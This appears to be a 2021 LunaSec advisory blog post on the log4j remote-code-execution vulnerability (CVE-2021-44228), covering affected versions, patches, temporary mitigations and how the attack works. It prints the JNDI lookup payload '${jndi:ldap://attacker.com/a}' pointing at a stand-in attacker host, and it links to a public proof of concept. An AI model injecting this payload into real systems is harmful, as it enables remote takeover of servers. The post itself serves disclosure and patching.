---
title: RCE 0-day exploit found in log4j, a popular Java logging package
description: Given how ubiquitous this library is, the impact of this vulnerability is quite severe. Learn how to patch it, why it's bad, and more in this post.
slug: log4j-zero-day
authors:
- name: Free Wortley 
  title: CEO at LunaSec 
  url: https://github.com/freeqaz
  image_url: https://github.com/freeqaz.png
  tags: [zero-day, security, data-security, data-breaches]
- name: Chris Thompson
  title: Developer at Lunasec
  url: https://github.com/breadchris
  image_url: https://github.com/breadchris.png

---
<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->

_Updated @ December 10th, 12am PST_

A few hours ago, a 0-day exploit in the
popular Java logging library `log4j` was discovered that results in Remote Code Execution (RCE) by
logging a certain string.

Given how ubiquitous this library is, the impact of the exploit (full server control), and how easy it is to exploit,
the impact of this vulnerability is quite severe. 

The 0-day was [tweeted](https://twitter.com/P0rZ9/status/1468949890571337731) along with a POC posted on
[GitHub](https://github.com/tangxiaofeng7/apache-log4j-poc).  ~~Since this vulnerability is still very new, there isn't a CVE to track
it yet.~~ This has been published as [CVE-2021-44228](https://www.randori.com/blog/cve-2021-44228/) now.

This post provides resources to help you understand the vulnerability and how to mitigate it for yourself.

<!--truncate-->

## Who is impacted?
Many, many services are vulnerable to this exploit.  Cloud services like [Steam, Apple iCloud](https://news.ycombinator.com/item?id=29499867), and apps like
Minecraft have already been found to be vulnerable.  

Anybody using Apache Struts is likely vulnerable. We've seen similar vulnerabilities exploited before in breaches like 
the [2017 Equifax data breach](https://en.wikipedia.org/wiki/2017_Equifax_data_breach#Data_breach).

Many Open Source projects
like the Minecraft server, [Paper](https://github.com/PaperMC/Paper/commit/b475c6a683fa34156b964f751985f36a784ca0e0),
have already begun patching their usage of `log4j`.

**Updates (3 hours after posting):**
According to [this blog post](https://www.cnblogs.com/yyhuni/p/15088134.html) (in [english](https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US)),
JDK versions greater than `6u211`, `7u201`, `8u191`, and `11.0.1` are not affected by the LDAP attack vector. In these versions
`com.sun.jndi.ldap.object.trustURLCodebase` is set to `false` meaning JNDI cannot load a remote codebase using LDAP. 

However, there are other attack vectors targeting this vulnerability which can result in RCE. Depending on what code is
present on the server, an attacker could leverage this existing code to execute a payload. An attack targeting the class
`org.apache.naming.factory.BeanFactory`, present on Apache Tomcat servers, is discussed
in [this blog post](https://www.veracode.com/blog/research/exploiting-jndi-injections-java). 

## Affected Apache log4j Versions

`2.0 <= Apache log4j <= 2.14.1`

## Permanent Mitigation

At the time this post was created (December 9th, 2021) no stable release is available. There is a patched release 
candidate of `log4j` published with versions `log4j-2.15.0-rc1` and `log4j-2.15.0-rc2` available on GitHub
[here](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2).

## Temporary Mitigation

As per [this discussion on HackerNews](https://news.ycombinator.com/item?id=29507263):

> The 'formatMsgNoLookups' property was added in version 2.10.0, per the JIRA Issue LOG4J2-2109 [1] that proposed it. Therefore the 'formatMsgNoLookups=true' mitigation strategy is available in version 2.10.0 and higher, but is no longer necessary with version 2.15.0, because it then becomes the default behavior [2][3].
> 
> If you are using a version older than 2.10.0 and cannot upgrade, your mitigation choices are:
> 
> - Modify every logging pattern layout to say `%m{nolookups}` instead of `%m` in your logging config files, see details at https://issues.apache.org/jira/browse/LOG4J2-2109 or,
>
> - Substitute a non-vulnerable or empty implementation of the class org.apache.logging.log4j.core.lookup.JndiLookup, in a way that your classloader uses your replacement instead of the vulnerable version of the class. Refer to your application's or stack's classloading documentation to understand this behavior.

## How the exploit works

### Exploit Requirements 
- A server with a vulnerable `log4j` version (listed above),
- an endpoint with any protocol (HTTP, TCP, etc) that allows an attacker to send the exploit string,
- and a log statement that logs out the string from that request.

### Example Vulnerable Code

```java
import org.apache.log4j.Logger;

import java.io.*;
import java.sql.SQLException;
import java.util.*;

public class VulnerableLog4jExampleHandler implements HttpHandler {

  static Logger log = Logger.getLogger(log4jExample.class.getName());

  /**
   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
   * This is basically pseudo-code to explain the vulnerability, and not a full example.
   * @param he HTTP Request Object
   */
  public void handle(HttpExchange he) throws IOException {
    string userAgent = he.getRequestHeader("user-agent");
    
    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
    log.info("Request User Agent:" + userAgent);

    String response = "<h1>Hello There, " + userAgent + "!</h1>";
    he.sendResponseHeaders(200, response.length());
    OutputStream os = he.getResponseBody();
    os.write(response.getBytes());
    os.close();
  }
}
```

### Exploit Steps
1. Data from the User gets sent to the server (via any protocol),
2. The server logs the data in the request, containing the malicious payload: `${jndi:ldap://attacker.com/a}` (where `attacker.com` is an attacker controlled server),
3. The `log4j` vulnerability is triggered by this payload and the server makes a request to `attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI),
4. This response contains a path to a remote Java class file (ex. `http://second-stage.attacker.com/Exploit.class`) which is injected into the server process,
5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.

Due to how common Java vulnerabilities such as these are, security researchers have created tools to easily exploit 
them. The [marshalsec](https://github.com/mbechler/marshalsec) project is one of many that demonstrates generating an
exploit payload that could be used for this vulnerability. You can refer to [this malicious LDAP server](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) for an example of exploitation. 

## More information

We'll continue to update this post as information about the impact of this exploit becomes available.

For now, we're just publishing this to help raise awareness and get people patching it. Please tell any of your friends 
running Java software!

### How you can prevent future attacks

Approaches like Tokenization can limit your vulnerability to attacks before they happen by requiring multiple exploits
to leak sensitive data.

[LunaSec](https://www.lunasec.io/docs/pages/overview/introduction/) is an Open Source Data Security framework designed 
to help [mitigate](https://www.lunasec.io/docs/pages/how-it-works/features/) attacks just like this one.

### Editing this post
If you have any updates or edits you'd like to make, you can edit this post as Markdown on
[GitHub](https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2021-12-09-log4j-zero-day.md). And please throw us a Star ⭐!

### Links
- **[Hacker News](https://news.ycombinator.com/item?id=29504755)**
- **[Reddit](https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/)**
- **[Twitter](https://twitter.com/freeqaz/status/1469121757361569793?s=20)**

### Edits

1. Updated the "Who is impacted?" section to include mitigating factor based on JDK version, but also suggest other exploitation
methods are still prevalent.
2. ~~Named the vulnerability "LogJam",~~ added CVE, and added link to release tags.
3. Update mitigation steps with newer information.
4. Removed the name "LogJam" because it's already been [used](https://en.wikipedia.org/wiki/Logjam_(computer_security)).

### References

[1] https://issues.apache.org/jira/browse/LOG4J2-2109

[2] https://github.com/apache/logging-log4j2/pull/607/files

[3] https://issues.apache.org/jira/browse/LOG4J2-3198

Also kudos to @80vul for [tweeting](https://twitter.com/80vul/status/1468968891489857537) about this.

